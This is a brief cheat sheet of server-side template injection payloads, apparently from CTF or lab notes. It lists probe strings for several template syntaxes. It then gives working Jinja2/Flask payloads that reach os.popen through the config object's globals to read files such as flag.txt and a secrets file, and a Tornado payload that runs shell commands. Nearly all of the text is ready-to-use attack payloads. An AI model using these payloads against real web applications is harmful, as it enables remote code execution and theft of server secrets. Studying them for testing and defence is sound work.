### Server Side Template Injection

---

Server side template injection is possible when an attacker injects template directive as user input that can execute arbitrary code on the server.
Example of a vulnerability : 

```py
{{5*5}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

---

#### Flask payload for Jinja2 : 
#### Config objects

The current configuration object : flask.config

Start with payload : `{{config.items()}}`
Then inject the second payload : `{{config.from_object('os')}}


```py
{{config.__class__.__init__.__globals__['os'].popen('cat flaskr/protected/burdellsecrets.txt').read()}}
{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}
```

---

#### Tornado payload

```py
{% import os %}{{ os.popen("ls").read() }}
```
